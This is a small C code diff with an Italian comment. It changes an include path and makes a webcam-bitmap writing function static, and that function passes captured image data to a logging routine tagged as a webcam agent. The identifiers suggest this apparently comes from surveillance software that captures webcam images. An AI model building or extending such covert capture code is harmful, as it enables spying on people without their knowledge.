@@ -1,5 +1,5 @@
 #include <dshow.h>
-#include "../../H4DLL/qedit.h"
+#include "qedit.h"
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/LOG.h"
 
@@ -35,7 +35,7 @@ void DeleteMediaType(AM_MEDIA_TYPE *pmt)
 }
 
 // Scrive l'immagine
-void WriteCamBitmap(BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
+static void WriteCamBitmap(BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
 {
 	BmpToJpgLog(PM_WEBCAMAGENT, NULL, 0, pBMI, cbBMI, pData, cbData, quality);
 }
